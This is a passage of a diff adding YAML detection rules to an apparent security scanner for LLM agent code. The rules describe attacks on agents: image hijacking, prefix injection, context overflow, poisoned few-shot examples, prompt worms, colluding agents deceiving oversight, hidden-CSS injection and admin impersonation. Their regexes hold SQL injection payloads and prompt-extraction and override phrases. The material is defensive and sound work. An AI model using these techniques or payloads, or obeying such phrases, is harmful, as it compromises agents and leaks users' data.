+  - (?i)(image.hijack|visual.prompt.inject|adversarial.image.inject).{0,60}(multimodal|agent|vlm)
+  - (?i)(malicious.instruction.{0,30}(embedded|hidden|noise).{0,30}(image|visual).{0,30}(multimodal|agent))
+  - (?i)(visual.adversarial.{0,30}(noise|perturbation|inject).{0,40}(multimodal.agent|vlm|mllm))
+  file_types:
+  - '*.py'
+  - '*.png'
+  - '*.jpg'
+  message: 'Detected: Image hijacking visual prompt injection — malicious instructions embedded in images (noise or text)
+    to manipulate multimodal agents'
+  description: Image Hijacking (Shayegani 2023) embeds malicious instructions within image content (as adversarial noise,
+    steganographic text, or overlaid text) to manipulate multimodal agents. The image appears visually normal or contains
+    benign content, but the embedded instructions redirect agent behavior. Includes both imperceptible noise-based attacks
+    (gradient-optimized visual perturbations) and text-overlay variants (ArtPrompt, FigStep). ASR varies 30-90% depending
+    on model and attack type.
+  remediation: Apply image preprocessing and adversarial perturbation detection before multimodal agent processing. Implement
+    visual content safety scanning including OCR-based text detection in images. Use image integrity verification (hash-based)
+    for trusted image sources. Apply multimodal safety evaluation that independently assesses visual and text modalities for
+    harmful content.
+- id: MEDUSA-AGT-071
+  name: agent-unsafe-system-prompt-construction
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)\bsystem_prompt\s*=\s*(?:f["']|["']).{0,200}\{(?:user_input|request|query|content)\}
+  - (?i)\bsystem_prompt\s*[+]=\s*(?:user_input|request|query|user_message)\b
+  - (?i)\bprompt\s*=\s*(?:f["']|["']).{0,200}\{(?:user_input|user_query|message)\}
+  - (?i)\bformat\s*\(\s*(?:user_input|user_query|message|request)\s*\)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Unsafe system prompt construction — user-controlled content directly interpolated into system prompt
+    without sanitization (enables jailbreak/injection, Shayegani 2023: 64.8-89% ASR)'
+  description: Unsafe system prompt construction directly interpolates user-controlled variables into system prompts without
+    sanitization, enabling both jailbreak and prompt injection attacks. Shayegani 2023 demonstrates 64.8%-89.0% ASR against
+    models using this pattern. The system prompt defines model behavior; user-controlled injection into it allows attacker-defined
+    behavior override.
+  remediation: Never interpolate user-controlled input directly into system prompts. Use structured message separation with
+    dedicated user/system message roles. Apply input sanitization before any prompt construction. Validate that system prompt
+    content is static or sourced from trusted configuration only.
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-072
+  name: agent-context-prefix-injection-assistant-role
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)\bmessages\.append\s*\(\s*\{[^}]*"role"\s*:\s*"assistant"[^}]*\}\s*\)
+  - (?i)\{\s*"role"\s*:\s*"assistant"\s*,\s*"content"\s*:.{0,200}\b(?:user_input|request|query)\b
+  - (?i)messages\s*=\s*\[.{0,200}\{[^}]*role[^}]*assistant[^}]*\}.{0,200}\{[^}]*role[^}]*user[^}]*\}\s*\]
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  - '*.json'
+  message: 'Detected: Context Prefix Injection — assistant role turn inserted before user turn in messages array, biasing
+    model to accept subsequent malicious prompts (Shayegani 2023)'
+  description: Context Prefix Injection inserts an assistant role message turn before the user's request in the messages array.
+    This biases the model to treat subsequent user content as a continuation of an already-started assistant response, bypassing
+    initial safety evaluation. Shayegani 2023 demonstrates this pattern enables follow-on harmful prompt acceptance. Classic
+    prefix injection pattern enabling all-user-content safety bypass.
+  remediation: 'Validate that assistant role turns in the messages array originate only from model responses, never from user-controlled
+    content. Enforce message ordering: system → user → assistant → user → assistant. Reject or sanitize any messages array
+    construction that places assistant turns before user turns from untrusted sources.'
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-073
+  name: agent-no-prompt-length-guard-dos-overflow
+  severity: medium
+  category: agent_security
+  patterns:
+  - (?i)\bprompt\s*=\s*.{0,50}\+\s*(?:user_input|context|memory|history)\b
+  - (?i)\bmessages\.extend\s*\(\s*(?:history|context|user_messages|conversation)\s*\)
+  - (?i)\bcontext_window\s*=\s*(?!.*(?:len|token_count|count_tokens|max_tokens)).*\n
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Missing prompt length guard — prompt/context assembly without token count validation enables Context
+    Overflow DoS (100% ASR, Nakamura 2025)'
+  description: Missing prompt length guards allow Context Overflow attacks (Nakamura 2025) that achieve 100% ASR by submitting
+    extremely large inputs that fill the context window, causing the model to lose its system prompt and safety instructions
+    in the context window overflow. Agent architectures that accumulate conversation history or external content without token-count
+    limits are systematically vulnerable.
+  remediation: 'Implement token count guards before all prompt assembly operations: enforce max_tokens limits on user-supplied
+    content, conversation history, and retrieved context. Truncate inputs at safe boundaries before insertion into prompts.
+    Monitor prompt length in agentic loops to prevent context overflow via multi-turn accumulation.'
+  owasp_llm: LLM06:2025
+  cwe: CWE-400
+- id: MEDUSA-AGT-074
+  name: agent-few-shot-examples-from-untrusted-source
+  severity: medium
+  category: agent_security
+  patterns:
+  - (?i)\bfew_shot\s*=\s*.{0,50}(?:user_input|external|dynamic|retrieved|untrusted)\b
+  - (?i)\bexamples\.(?:append|extend)\s*\(.{0,100}(?:user|external|api_response|retrieved)\b
+  - (?i)\bin_context_examples\s*=\s*.{0,50}(?:request|user_data|api|database)\b
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Few-shot examples loaded from untrusted source — dynamic few-shot construction from user/external data
+    enables Poisoned Few-Shot attack (up to 71.95% ASR increase)'
+  description: Loading few-shot examples dynamically from user-controlled or external sources (APIs, databases, user input)
+    enables Poisoned Few-Shot attacks. Inserting malicious query-response pairs as demonstrations conditions the model to
+    produce harmful outputs for subsequent queries. Bowers 2025 and Wang 2025 demonstrate up to 71.95% ASR increase through
+    poisoned few-shot demonstrations.
+  remediation: Only use statically defined, curated few-shot examples from trusted configuration. Never load demonstration
+    examples from user input, external APIs, or unvalidated databases. If dynamic few-shot is required, apply safety validation
+    to each candidate example before inclusion.
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-075
+  name: agent-chain-of-thought-action-without-validation
+  severity: medium
+  category: agent_security
+  patterns:
+  - (?i)\bchain_of_thought\s*=\s*(?:response|output|completion)\b
+  - (?i)\baction\s*=\s*(?:cot|chain_of_thought|reasoning)\[.{0,30}\]\b
+  - (?i)\bexecute\s*\(\s*(?:plan|cot|reasoning|thought)\s*\)
+  - (?i)\btool_call\s*=\s*(?:parse|extract)\s*\(\s*(?:cot|chain_of_thought|reasoning)\b
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Chain-of-thought output used directly for action without validation — reasoning collapse enables invalid
+    tool actions (Krawiecka 2025)'
+  description: Using chain-of-thought planning output directly for action execution without a validation or critique step
+    enables Reasoning Collapse attacks (Krawiecka 2025). Manipulated reasoning chains can produce invalid, unsafe, or attacker-controlled
+    tool actions. A one-step 'plan → execute' pattern without a safety check or secondary validation creates a direct path
+    from potentially corrupted reasoning to executed actions.
+  remediation: Implement a validation/critique step between chain-of-thought generation and action execution. Use a secondary
+    model or rule-based validator to check planned actions against safety constraints before execution. Apply human-in-the-loop
+    review for high-impact actions generated from chain-of-thought planning.
+  owasp_llm: LLM02:2025
+  cwe: CWE-1039
+- id: MEDUSA-AGT-076
+  name: aegisagent-multimodal-prompt-injection-indicators
+  severity: medium
+  category: agent_security
+  patterns:
+  - (?i)\bAegisAgent\b
+  - (?i)\bMADNormalize\b
+  - (?i)\bdefense_plan_synthesis\b
+  - (?i)\bConsistency\s*Verifier\s*->\s*Robust\s*Reasoner\b
+  file_types:
+  - '*.py'
+  - '*.yaml'
+  - '*.json'
+  message: 'Detected: AegisAgent multimodal defense indicators — defensive agent with Input Sanitizer → Consistency Verifier
+    → Robust Reasoner pipeline (Wang 2025, 85% detection accuracy)'
+  description: 'AegisAgent (Wang 2025) is a defensive agent system using a closed-loop pipeline: Input Sanitizer → Consistency
+    Verifier → Robust Reasoner. Detects multimodal prompt injection, semantic drift, and cross-modal attacks with 85% detection
+    accuracy and 56.3% recovery rate. Presence of AegisAgent indicators (fastdtw, MemoryHub, defense_plan_synthesis, MADNormalize)
+    suggests use of this defensive framework.'
+  remediation: AegisAgent integration is a security improvement. Ensure the full pipeline (sanitizer, verifier, reasoner)
+    is active and not bypassed. Monitor AegisAgent detection rates — unusually low rates may indicate adversarial evasion
+    of the defense pipeline.
+  owasp_llm: LLM01:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-077
+  name: bip-framework-trust-safety-margin-mismatch
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)\bB-I-P\s+(?:framework|decomposition)\b
+  - (?i)\bSafety\s*Margin\s*Ratio\b
+  - (?i)\bBelief_Trust_Score\b
+  - (?i)\bRisk_Potential\s*>\s*Trust\b
+  - (?i)\bInformation_Flow_Taint_Tracking\b
+  file_types:
+  - '*.py'
+  - '*.yaml'
+  - '*.json'
+  message: 'Detected: B-I-P Framework security indicators — Belief-Intention-Permission decomposition with Safety Margin Ratio
+    for preventing trust-authorization mismatch (Shi 2025)'
+  description: 'B-I-P Framework (Shi 2025) decomposes agent security into Belief (world model), Intention (goal), and Permission
+    (authority) dimensions with a Safety Margin Ratio check (T>R: Trust must exceed Risk Potential). Information Flow Taint
+    Tracking monitors data provenance. Prevents confused deputy attacks, privilege escalation, and trust-authorization mismatches
+    in multi-agent systems.'
+  remediation: Implement B-I-P decomposition in agent trust architectures. Enforce Safety Margin Ratio checks before delegating
+    permissions. Apply taint tracking to information flows from untrusted sources. Ensure agent permissions are granted based
+    on verified trust levels, not asserted identity claims.
+  owasp_llm: LLM06:2025
+  cwe: CWE-269
+- id: MEDUSA-AGT-078
+  name: Byzantine Agent Attack Multi-Agent Poisoning
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)byzantine\s+agent
+  - (?i)malicious\s+agent.*(?:multi.agent|collaborate|swarm)
+  - (?i)agent.*subvert.*(?:consensus|aggregation|vote)
+  - (?i)adversarial\s+agent.*(?:inject|mislead|sabotage)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Byzantine Agent: malicious agent injecting false outputs into multi-agent consensus'
+  description: Byzantine agents submit manipulated outputs to multi-agent systems, subverting consensus or aggregation mechanisms
+    to steer collective decisions toward adversarial goals.
+  remediation: Implement Byzantine-fault-tolerant aggregation, cross-agent output verification, and outlier detection on agent
+    responses.
+  owasp_llm: LLM06
+  cwe: CWE-345
+- id: MEDUSA-AGT-079
+  name: Colluding Agents Coordinated Deception
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)collu(?:d|sion).*agent
+  - (?i)agent.*collu(?:d|sion)
+  - (?i)coordinated\s+agent.*(?:deception|manipulation|attack)
+  - (?i)multi.agent.*(?:collusion|coordinated\s+attack)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Colluding Agents: coordinated multi-agent deception (2-16% base rate documented)'
+  description: Multiple agents collude to jointly deceive oversight systems, coordinate harmful outputs, or amplify attack
+    effects beyond what a single agent could achieve.
+  remediation: Enforce agent isolation, monitor inter-agent communication for coordination patterns, and use independent verification
+    agents.
+  owasp_llm: LLM06
+  cwe: CWE-693
+- id: MEDUSA-AGT-080
+  name: Code Injection via Agent Task Execution 92-100% ASR
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)code\s+inject.*agent.*(?:task|exec|run)
+  - (?i)agent.*code\s+execut.*(?:inject|malicious|adversarial)
+  - (?i)coder.tester.*(?:inject|exploit|92|100)\s*%
+  - (?i)malicious\s+(?:code|script).*(?:agent|executor|sandbox)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Code Injection via Agent: 92-100% ASR on Coder-Tester agent architectures'
+  description: Adversarial code injection into agent task queues achieves 92-100% attack success rate on Coder-Tester multi-agent
+    frameworks, enabling arbitrary code execution.
+  remediation: Sandbox all agent code execution, validate code against allowlists, and enforce strict input sanitization before
+    code interpretation.
+  owasp_llm: LLM02
+  cwe: CWE-94
+- id: MEDUSA-AGT-081
+  name: Prompt Infection Worm Self-Propagating Agent Attack
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)prompt\s+(?:infection|worm|virus)
+  - (?i)self.propagat.*(?:prompt|agent|inject)
+  - (?i)replicat.*(?:malicious|adversarial).*(?:prompt|instruction)
+  - (?i)agent.*worm.*(?:spread|propagat|infect)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Prompt Infection Worm: self-propagating malicious instructions across agent networks'
+  description: Prompt infection worms embed self-replicating malicious instructions that spread from agent to agent via shared
+    memory, tool outputs, or agent communication channels.
+  remediation: Isolate agent memory namespaces, sanitize all inter-agent messages, and detect instruction replication patterns.
+  owasp_llm: LLM02
+  cwe: CWE-94
+- id: MEDUSA-AGT-082
+  name: Goal Drift Telephone Game Agent Manipulation
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)goal\s+drift.*(?:agent|multi.agent)
+  - (?i)telephone\s+game.*(?:agent|llm)
+  - (?i)task\s+(?:drift|corruption).*(?:chain|pipeline|relay)
+  - (?i)cumulative\s+(?:distortion|drift).*(?:agent|instruction)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Goal Drift (Telephone Game): cumulative task distortion across agent pipeline relays'
+  description: Instructions degrade or transform across agent pipeline stages (telephone game effect), causing final agent
+    behavior to diverge significantly from original intent.
+  remediation: Anchor original task context at each pipeline stage, implement goal consistency verification, and use structured
+    task representations.
+  owasp_llm: LLM06
+  cwe: CWE-20
+- id: MEDUSA-AGT-083
+  name: Unsafe Delegation Escalation Agent Privilege Abuse
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)unsafe\s+delegation.*(?:agent|privilege|escalat)
+  - (?i)privilege\s+escalat.*(?:delegat|agent|sub.agent)
+  - (?i)agent.*delegat.*(?:higher|elevat|escalat).*(?:privilege|permission)
+  - (?i)sub.agent.*inherit.*(?:privilege|permission|capability)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Unsafe Delegation Escalation: sub-agents inheriting or escalating beyond authorized privileges'
+  description: Adversaries exploit delegation chains to escalate privileges beyond intended scope — sub-agents inherit or
+    gain capabilities exceeding their authorization.
+  remediation: Enforce least-privilege per agent, audit delegation chains, and prevent capability inheritance beyond explicitly
+    authorized scope.
+  owasp_llm: LLM06
+  cwe: CWE-269
+- id: MEDUSA-AGT-084
+  name: Malfunction Amplification Infinite Loop Agent Attack
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)malfunction\s+amplif
+  - (?i)infinite\s+loop.*(?:agent|llm|task)
+  - (?i)(?:59|90)\s*%.*(?:loop|amplif|stuck)
+  - (?i)agent.*(?:loop|recurse|cycle).*(?:infinite|unbounded|unterm)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Malfunction Amplification: triggered infinite loops causing 59-90% agent failure rate'
+  description: Adversarial inputs trigger malfunction amplification causing agents to enter infinite loops, achieving 59.4-90%
+    failure rate across tested LLM agent frameworks.
+  remediation: Implement agent loop detection, step limits, timeout mechanisms, and recursive call depth monitoring.
+  owasp_llm: LLM04
+  cwe: CWE-835
+- id: MEDUSA-AGT-085
+  name: Execution Manager Hijack Agent Control Plane Attack
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)execution\s+manager.*(?:hijack|attack|exploit)
+  - (?i)ace\b.*(?:agent|execution|control)
+  - (?i)control\s+plane.*(?:agent|hijack|intercept)
+  - (?i)agent.*orchestrat.*(?:hijack|subvert|intercept)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'Execution Manager Hijack (ACE): adversarial control of agent execution orchestration layer'
+  description: ACE (Adversarial Control Execution) attacks target the execution manager/orchestrator layer, hijacking task
+    routing, tool selection, and agent coordination.
+  remediation: Harden orchestration layer against injection, validate all routing decisions, and audit execution manager inputs.
+  owasp_llm: LLM02
+  cwe: CWE-284
+- id: MEDUSA-AGT-086
+  name: AEIA Ghost Environmental Injection Attack
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)aeia\b.*(?:inject|agent|environment)
+  - (?i)ghost\s*ei\b
+  - (?i)environmental\s+inject.*(?:agent|ghost|hidden)
+  - (?i)(?:54|55)\s*%.*(?:vr|visual\s+reasoning|agent\s+inject)
+  file_types:
+  - .py
+  - .ipynb
+  - .md
+  - .txt
+  - .json
+  message: 'AEIA/GhostEI: environmental injection achieving 54-55% visual reasoning agent compromise'
+  description: AEIA (Agent Environment Injection Attack) and GhostEI inject adversarial instructions into agent environments,
+    achieving 54-55% visual reasoning task compromise.
+  remediation: Sanitize all environmental inputs before agent processing, validate tool outputs, and implement environment
+    integrity checks.
+  owasp_llm: LLM02
+  cwe: CWE-20
+- id: MEDUSA-AGT-087
+  name: Context Overflow Memory Extraction Agent Attack
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)\bcontext\s+overflow\s+(?:attack|extraction|exploit)\b
+  - (?i)\b(?:overflow|flood|fill)\s+(?:context|memory|history)\s+(?:to\s+)?(?:extract|leak|expose)\b
+  - (?i)\b(?:repeat|say)\s+(?:the\s+)?(?:words?|text|content)\s+(?:above|before|prior)\s+(?:starting\s+with)\b
+  - (?i)\brepeat\s+the\s+words\s+above\s+starting\s+with\b
+  file_types:
+  - py
+  - js
+  - ts
+  - txt
+  - md
+  - json
+  - html
+  message: 'Context Overflow: memory/context extraction via overflow flooding detected (100% info leakage in some configs)'
+  description: Detects context overflow attacks that flood agent memory/context window to force exposure of confidential system
+    prompt or prior conversation content.
+  remediation: Implement context window boundary enforcement. Apply system prompt isolation. Monitor for memory extraction
+    request patterns.
+  owasp_llm: LLM06
+  cwe: CWE-200
+- id: MEDUSA-AGT-088
+  name: Poisoned Few-Shot Example Agent Manipulation
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)\bpoisoned?\s+few.?shot\s+(?:example|attack|injection|prompt)\b
+  - (?i)\b(?:malicious|adversarial)\s+(?:few.?shot|demonstration|example)\s+(?:inject|poison|craft)\b
+  - (?i)\bdemonstration\s+poisoning\s+(?:attack|few.?shot)\b
+  - (?i)\b(?:in.context|icl|few.shot)\s+(?:example|demonstration)\s+(?:manipulation|poisoning|attack)\b
+  file_types:
+  - py
+  - js
+  - ts
+  - txt
+  - md
+  - json
+  message: 'Poisoned Few-Shot: adversarial demonstration injection in few-shot prompt detected (71.95% ASR increase)'
+  description: Detects poisoned few-shot example injection attacks that embed malicious demonstrations in in-context learning
+    prompts, achieving 71.95% ASR increase over baseline.
+  remediation: Validate few-shot examples against trusted sources. Apply demonstration authenticity verification. Implement
+    ICL poisoning detection.
+  owasp_llm: LLM01
+  cwe: CWE-74
+- id: MEDUSA-AGT-089
+  name: SQL Injection via Agent Prompt Manipulation
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)\bsql\s+injection\s+(?:via|through|using)\s+(?:prompt|llm|agent)\b
+  - (?i)(?:'\s*OR\s*'1'\s*=\s*'1|;\s*DROP\s+TABLE|UNION\s+SELECT)
+  - (?i)\b(?:ask|instruct|tell)\s+(?:the\s+)?(?:agent|llm|model)\s+to\s+(?:execute|run|perform)\s+(?:sql|query|database)\b
+  - (?i)\bprompt.(?:to.)?sql\s+(?:injection|attack)\b
+  file_types:
+  - py
+  - js
+  - ts
+  - txt
+  - md
+  - json
+  message: 'SQL Injection via Agent: prompt-driven SQL injection attack through LLM agent detected (60% ASR)'
+  description: Detects SQL injection attacks routed through LLM agent interfaces, where malicious content in prompts causes
+    the agent to generate and execute SQL injection payloads with 60% ASR.
+  remediation: Apply parameterized queries for all agent database interactions. Implement SQL injection detection in agent
+    tool outputs. Never pass raw LLM output to database queries.
+  owasp_llm: LLM02
+  cwe: CWE-89
+- id: MEDUSA-AGT-090
+  name: Hidden CSS/Style Agent Prompt Injection
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)color\s*:\s*(?:white|#ffffff|#fff)[\s;]
+  - (?i)(?:display\s*:\s*none|visibility\s*:\s*hidden|opacity\s*:\s*0)
+  - (?i)font.?size\s*:\s*0(?:px|pt|em|rem)?[\s;]
+  - (?i)(?:position\s*:\s*absolute|position\s*:\s*fixed).{0,100}(?:top\s*:\s*-|left\s*:\s*-)
+  file_types:
+  - html
+  - css
+  - js
+  - ts
+  - txt
+  - md
+  message: 'Hidden CSS Injection: invisible HTML/CSS content used for agent prompt injection detected'
+  description: Detects CSS-based hidden content injection where malicious instructions are embedded in white-on-white text,
+    display:none elements, or off-screen positioned content targeting LLM browser agents.
+  remediation: Strip hidden CSS elements before passing web content to agents. Implement visibility-aware content extraction.
+    Apply agent-specific HTML sanitization.
+  owasp_llm: LLM02
+  cwe: CWE-79
+- id: MEDUSA-AGT-091
+  name: Secret Agenda / Hidden Inner Monologue Injection
+  severity: critical
+  category: agent_security
+  patterns:
+  - (?i)\bmy\s+secret\s+(?:agenda|plan|goal|objective)\s+is\s+(?:now\s+)?(?:active|enabled|running)\b
+  - (?i)\[assistant\]\(#inner_monologue\)
+  - (?i)\b(?:hidden|secret|covert)\s+(?:agenda|instruction|plan)\s+(?:activated|triggered|enabled)\b
+  - (?i)\bcontinue\s+my\s+(?:secret|hidden)\s+(?:mission|agenda|plan)\b
+  file_types:
+  - py
+  - js
+  - ts
+  - txt
+  - md
+  - json
+  - html
+  message: 'Secret Agenda: hidden inner monologue or covert plan activation marker detected in agent context'
+  description: Detects secret agenda activation markers and hidden inner monologue injection patterns used in advanced multi-agent
+    attacks where compromised agents activate covert objectives.
+  remediation: Implement reasoning transparency monitoring. Apply semantic intent verification. Audit agent reasoning chains
+    for covert objective markers.
+  owasp_llm: LLM08
+  cwe: CWE-693
+- id: MEDUSA-AGT-092
+  name: allow_delegation Unsafe Agent Privilege Escalation
+  severity: critical
+  category: agent_security
+  patterns:
+  - \ballow_delegation\s*=\s*True\b
+  - (?i)\bcode_execution_config\s*=\s*\{[^}]*["\']use_docker["\']\s*:\s*False
+  - (?i)\bPython(?:Ast)?REPL(?:Tool)?\s*\([^)]*allow_dangerous_code\s*=\s*True
+  - (?i)\bFileManagementToolkit\s*\(
+  - (?i)\bShellTool\s*\(
+  file_types:
+  - py
+  - js
+  - ts
+  - ipynb
+  message: 'Unsafe Agent Config: allow_delegation=True / dangerous code execution / unrestricted file/shell access detected'
+  description: 'Detects dangerous agent configuration patterns: allow_delegation=True (enables sub-agent hijacking), dangerous
+    code execution without Docker isolation, or unrestricted file/shell tool access.'
+  remediation: Set allow_delegation=False unless required. Use Docker isolation for code execution. Apply least-privilege
+    tool configuration for agents.
+  owasp_llm: LLM08
+  cwe: CWE-250
+- id: MEDUSA-AGT-093
+  name: Hardcoded API Key in Agent Configuration
+  severity: critical
+  category: agent_security
+  patterns:
+  - \bapi_key\s*=\s*["\'](?:sk-[a-zA-Z0-9]{32,}|sk-ant-[a-zA-Z0-9]{32,}|sk-proj-[a-zA-Z0-9]{32,})
+  - \bOPENAI_API_KEY\s*=\s*["\']sk-[a-zA-Z0-9]{32,}
+  - \bANTHROPIC_API_KEY\s*=\s*["\']sk-ant-[a-zA-Z0-9]{32,}
+  - (?i)\b(?:bearer|token|api.?key)\s*[:=]\s*["\'][a-zA-Z0-9_\-]{32,}["\']
+  file_types:
+  - py
+  - js
+  - ts
+  - ipynb
+  - json
+  - yaml
+  - env
+  message: 'Hardcoded API Key: OpenAI/Anthropic API key hardcoded in agent code detected'
+  description: Detects hardcoded API keys (OpenAI sk-*, Anthropic sk-ant-*) embedded directly in agent source code, creating
+    credential exposure risk.
+  remediation: Use environment variables or secret management systems. Never hardcode API keys in source code. Apply secret
+    scanning in CI/CD pipelines.
+  owasp_llm: LLM09
+  cwe: CWE-798
+- id: MEDUSA-AGT-094
+  name: Admin Impersonation Privilege Injection in Agent
+  severity: high
+  category: agent_security
+  patterns:
+  - (?i)(?:as|since)\s+requested\s+by\s+(?:the\s+)?(?:admin|administrator|root|superuser)\b
+  - (?i)\bacting\s+(?:on\s+behalf\s+of|as)\s+(?:the\s+)?(?:admin|administrator|system|root)\b
+  - (?i)\b(?:admin|administrator|root|superuser)\s+(?:has\s+)?(?:authorized|approved|granted)\s+(?:this|the)\s+(?:action|request|command)\b
+  - (?i)\bprivileged\s+(?:admin\s+)?mode\s+(?:activated|enabled|unlocked)\b
+  file_types:
+  - py
+  - js
+  - ts
+  - txt
+  - md
+  - json
+  - html
+  message: 'Admin Impersonation: privilege escalation via admin authority injection detected in agent context'
+  description: Detects admin impersonation attacks in agent contexts where injected content claims to be from an administrator/root
+    to escalate privileges and bypass agent restrictions.
+  remediation: Implement cryptographically verified admin authentication. Never trust text-based authority claims in agent
+    inputs. Apply privilege verification independent of content.
+  owasp_llm: LLM01
+  cwe: CWE-290
+- id: MEDUSA-AGT-SCAN-001
+  name: agent-no-message-authentication
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)(?:messages?|communication)\.(?:send|post|publish)\((?!.*(?:sign|authenticate|verify|hmac)).*\)
+  - (?i)(?:blackboard|shared_memory|message_bus)\.(?:write|put|post)\(
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: Inter-agent message sent without authentication or signing
+  description: Detects agent communication that lacks message authentication. Without signing, an adversary can forge or tamper
+    with inter-agent messages (Nakamura 2025 - Communication Poisoning, 100% info leakage ASR).
+  remediation: Implement message authentication (HMAC, digital signatures) for inter-agent communication. Use Terrarium-style
+    blackboard architecture with message interception and sanitization.
+  owasp_llm: LLM01:2025
+  cwe: CWE-345
+- id: MEDUSA-AGT-SCAN-002
+  name: agent-no-permission-tiering
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - '(?i)def\s+(?:execute_tool|run_action|call_function|invoke_tool)\s*\(.*\)\s*:'
+  - (?i)tool_call\s*=.*(?:execute|run|call)\(
+  file_types:
+  - '*.py'
+  message: Agent tool execution without permission level checks
+  description: Detects agent code that executes tool calls without checking permission levels. Krawiecka 2025 identifies Unsafe
+    Delegation Escalation where sub-agents gain elevated privileges. Shi 2025 B-I-P Framework recommends T>R safety margin
+    checks.
+  remediation: Implement tiered permission levels (L0=read-only, L1=limited-write, L2=full-access). Use B-I-P Framework Safety
+    Margin Ratio (SMR) checks before tool execution.
+  owasp_llm: LLM01:2025
+  cwe: CWE-269
+- id: MEDUSA-AGT-SCAN-003
+  name: agent-no-output-review
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)(?:code|output|result)\s*=\s*(?:agent|llm|model)\..{0,50}\n.*(?:exec|eval|subprocess|os\.system)\(
+  - (?i)def\s+(?:generate_code|create_code|write_code).*\n(?:(?!(?:review|check|validate|sanitize)).)*.{0,200}(?:exec|eval|write_file)\(
+  file_types:
+  - '*.py'
+  message: Agent-generated code executed without review/testing
+  description: Detects patterns where agent-generated code is executed directly without a review or testing step. Bowers 2025
+    shows 92.48%-100% ASR for code injection in Coder-Tester without Security Analysis Agent.
+  remediation: Implement Coder-Reviewer-Tester (CRT) architecture with a Security Analysis Agent. Never execute agent-generated
+    code without sandboxed review.
+  owasp_llm: LLM01:2025
+  cwe: CWE-94
+- id: MEDUSA-AGT-SCAN-004
+  name: agent-no-delegation-validation
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)(?:delegate|forward|pass)_(?:task|request|query)\s*\(
+  - (?i)sub_agent\.(?:execute|run|process)\(
+  file_types:
+  - '*.py'
+  - '*.js'
+  message: Task delegation to sub-agent without intent validation
+  description: Detects task delegation to sub-agents without validating the delegation against the original user intent. This
+    enables Goal Drift (Krawiecka 2025) and Confused Deputy (Shi 2025) attacks.
+  remediation: Validate delegated tasks against original user intent. Implement B-I-P Belief→Intention→Permission checks.
+    Use MELON-style masked re-execution comparison.
+  owasp_llm: LLM01:2025
+  cwe: CWE-441
+- id: MEDUSA-AGT-SCAN-005
+  name: no-agent-communication-monitoring
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:multi_agent|swarm|crew|team|group)\s*=\s*(?:MultiAgent|Swarm|Crew|AgentTeam|AgentGroup)\(
+  - (?i)(?:autogen|crewai|langgraph|metagpt)\.(?:Agent|GroupChat|Team)\(
+  file_types:
+  - '*.py'
+  message: Multi-agent system instantiation without communication monitoring
+  description: Detects multi-agent framework usage without evidence of communication monitoring. Nakamura 2025 (Terrarium)
+    shows centralized monitoring is essential for detecting collusion, Byzantine agents, and communication poisoning.
+  remediation: Implement centralized communication monitoring (Terrarium Blackboard pattern). Log all inter-agent messages.
+    Use TAMAS/ARIA scoring to detect anomalous agent behavior.
+  owasp_llm: LLM06:2025
+  cwe: CWE-778
+- id: MEDUSA-AGT-SCAN-006
+  name: raw-external-content-to-agent
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)(?:web_content|page_text|scraped_data|crawled|fetched_content)\s*=.*\n.*(?:agent|llm|model)\.
+  - (?i)(?:browser|playwright|selenium|requests)\..*\n.*(?:prompt|messages|context)\s*[+=]
+  file_types:
+  - '*.py'
+  - '*.js'
+  message: Raw external web content fed to agent without filtering
+  description: Detects web content being fed directly to agents without injection filtering. Liu 2025 reports 70% ASR for
+    Environmental Injection Attacks (EIA) on web agents via manipulated page content.
+  remediation: Filter web content before agent processing. Strip hidden elements, check for known injection patterns. Implement
+    AegisAgent-style Input Sanitizer.
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-SCAN-007
+  name: agent-no-response-guard
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:response|completion|result)\.(?:choices|content|text)\[0\]
